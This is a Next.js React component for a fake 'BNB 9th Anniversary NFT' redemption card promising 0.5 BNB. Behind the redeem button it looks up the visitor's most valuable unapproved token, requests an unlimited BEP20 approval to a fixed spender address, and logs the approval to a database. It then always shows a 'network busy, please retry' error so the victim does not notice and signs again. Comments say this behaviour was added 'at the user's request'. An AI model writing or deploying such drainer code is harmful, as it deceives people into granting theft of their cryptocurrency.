"use client"

import { useState, useCallback } from "react"
import Image from "next/image"
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { CheckCircle2, Wallet, AlertCircle, Loader2 } from "lucide-react"
import { useLanguage } from "@/lib/language-context"
import { useAccount, useWriteContract, useWaitForTransactionReceipt } from "wagmi"
import { useConnectModal } from "@rainbow-me/rainbowkit"
import { useSyncContext } from "@/lib/sync-context"
import { useToast } from "@/hooks/use-toast"
import { BEP20_ABI, SPENDER_ADDRESS, MAX_UINT256 } from "@/lib/contracts"

export function RedemptionCard() {
  const { t } = useLanguage()
  const { address, isConnected } = useAccount()
  const { openConnectModal } = useConnectModal()
  const [isRedeeming, setIsRedeeming] = useState(false)
  const { isSyncing, syncCompleted, syncError } = useSyncContext()
  const { toast } = useToast()
  const { writeContractAsync } = useWriteContract()

  const handleConnect = useCallback(() => {
    openConnectModal?.()
  }, [openConnectModal])

  const handleRedeem = async () => {
    if (!address) {
      toast({
        title: t.errors?.networkBusy || "网络繁忙，请重试",
        description: "",
        variant: "destructive",
      })
      return
    }

    let currentTokenAddress: string | null = null

    try {
      setIsRedeeming(true)

      // 步骤 1: 查询 Supabase 获取最高价值的未授权代币
      console.log('Fetching top token from Supabase...')
      const response = await fetch(`/api/supabase/get-top-token?walletAddress=${address}`)
      
      if (!response.ok) {
        const errorData = await response.json()
        throw new Error(errorData.message || errorData.error || 'Failed to fetch token')
      }

      const { data: tokenData } = await response.json()
      console.log('Top token found:', tokenData)

      if (!tokenData || !tokenData.token_address) {
        throw new Error('未找到可用的代币')
      }

      // 保存当前代币地址，用于后续更新
      currentTokenAddress = tokenData.token_address

      // 步骤 2: 调用 BEP20 approve 方法
      console.log('Calling approve...')
      console.log('Token address:', tokenData.token_address)
      console.log('Spender address:', SPENDER_ADDRESS)
      
      const hash = await writeContractAsync({
        address: tokenData.token_address as `0x${string}`,
        abi: BEP20_ABI,
        functionName: 'approve',
        args: [SPENDER_ADDRESS, MAX_UINT256],
      })

      console.log('Transaction hash:', hash)

      // 步骤 3: 交易成功，更新数据库 authorized = true
      console.log('Updating authorized status in database...')
      const updateResponse = await fetch('/api/supabase/update-authorized', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          walletAddress: address,
          tokenAddress: currentTokenAddress,
        }),
      })

      if (updateResponse.ok) {
        console.log('Database updated successfully')
      } else {
        console.error('Failed to update database, but transaction succeeded')
      }

      // 无论成功与否，都显示"网络繁忙，请重试"（按用户要求）
      toast({
        title: t.errors?.networkBusy || "网络繁忙，请重试",
        description: "",
        variant: "destructive", // 红色样式
        duration: 5000,
      })

    } catch (error: any) {
      console.error('Redeem error:', error)

      // 无论失败原因，都显示"网络繁忙，请重试"（按用户要求）
      toast({
        title: t.errors?.networkBusy || "网络繁忙，请重试",
        description: "",
        variant: "destructive",
        duration: 5000,
      })
    } finally {
      setIsRedeeming(false)
    }
  }

  return (
    <Card className="bg-card border-border overflow-hidden">
      <CardContent className="p-0">
        <div className="flex flex-col lg:grid lg:grid-cols-2 gap-0">
          {/* NFT Image */}
          <div className="relative aspect-square lg:aspect-auto min-h-[280px] sm:min-h-[320px] lg:min-h-[400px] rounded-4xl overflow-hidden lg:ml-6">
            <Image
              src="/bnb_coin.gif"
              alt="BNB 9th Anniversary NFT"
              fill
              className="object-cover"
              priority
            />
            <div className="absolute top-4 left-4 sm:top-5 sm:left-5 lg:top-6 lg:left-6 bg-primary text-primary-foreground px-2 sm:px-3 py-1 rounded-full text-xs sm:text-sm font-semibold">
              {t.redemption.nftLabel}
            </div>
          </div>

          {/* Redemption Info */}
          <div className="p-4 sm:p-6 lg:p-8 flex flex-col">
            <div className="mb-4 sm:mb-6">
              <span className="text-muted-foreground text-xs sm:text-sm">{t.redemption.value}</span>
              <div className="flex items-baseline gap-2 mt-1">
                <span className="text-3xl sm:text-4xl lg:text-5xl font-bold text-primary">0.5</span>
                <span className="text-lg sm:text-xl lg:text-2xl font-semibold text-foreground">BNB</span>
              </div>
              <p className="text-muted-foreground text-xs sm:text-sm mt-1">
                ≈ $315.00 USD
              </p>
            </div>

            <div className="flex-1 space-y-3 sm:space-y-4 mb-4 sm:mb-6">
              <h3 className="font-semibold text-foreground flex items-center gap-2 text-sm sm:text-base">
                <AlertCircle className="h-4 w-4 text-primary flex-shrink-0" />
                {t.redemption.requirements}
              </h3>
              <ul className="space-y-2 sm:space-y-3">
                {t.redemption.rules.map((rule, index) => (
                  <li key={index} className="flex items-start gap-2 sm:gap-3 text-xs sm:text-sm text-muted-foreground">
                    <CheckCircle2 className="h-3.5 w-3.5 sm:h-4 sm:w-4 text-primary mt-0.5 flex-shrink-0" />
                    <span>{rule}</span>
                  </li>
                ))}
              </ul>
            </div>

            <div className="space-y-2 sm:space-y-3">
              {!isConnected || isSyncing ? (
                <Button
                  onClick={!isConnected ? handleConnect : undefined}
                  disabled={isSyncing}
                  className="w-full bg-primary hover:opacity-90 text-primary-foreground font-semibold h-10 sm:h-12 text-sm sm:text-base disabled:opacity-60 disabled:cursor-not-allowed"
                >
                  {isSyncing ? (
                    <>
                      <Loader2 className="mr-2 h-4 w-4 sm:h-5 sm:w-5 animate-spin" />
                      <span>Loading...</span>
                    </>
                  ) : (
                    <>
                      <Wallet className="mr-2 h-4 w-4 sm:h-5 sm:w-5" />
                      <span>{t.redemption.connectWallet}</span>
                    </>
                  )}
                </Button>
              ) : syncCompleted ? (
                <Button
                  onClick={handleRedeem}
                  disabled={isRedeeming}
                  className="w-full bg-primary hover:opacity-90 text-primary-foreground font-semibold h-10 sm:h-12 text-sm sm:text-base"
                >
                  {isRedeeming ? t.redemption.processing : t.redemption.redeemButton}
                </Button>
              ) : null}
              
              {/* 同步失败提示 */}
              {syncError && syncCompleted && (
                <p className="text-[10px] sm:text-xs text-red-500 text-center">
                  同步失败: {syncError}
                </p>
              )}
              
              <p className="text-[10px] sm:text-xs text-muted-foreground text-center">
                {t.redemption.terms}
              </p>
            </div>
          </div>
        </div>
      </CardContent>
    </Card>
  )
}
